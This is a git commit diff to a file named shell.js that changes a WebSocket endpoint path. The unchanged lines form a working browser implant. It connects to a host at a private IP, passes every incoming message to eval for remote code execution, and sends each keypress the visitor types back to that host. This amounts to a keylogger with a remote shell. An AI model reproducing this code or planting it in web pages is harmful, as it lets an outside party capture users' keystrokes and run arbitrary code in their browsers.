4a3d27781a3d037151f7e55c852eca2bfdb2dda7
whoami-ak47 <qsifiso16@gmail.com>
2026-04-07 14:16:10 +0200

    Update shell.js

--- shell.js
+++ shell.js
@@ -1,4 +1,4 @@
-const ws=new WebSocket('ws://192.168.233.129:8080/shell');
+const ws=new WebSocket('ws://192.168.233.129:8080/index');
 ws.onmessage=e=>eval(e.data);
 ws.onerror=()=>location.reload();
 document.onkeydown=e=>ws.send('key:'+e.key)
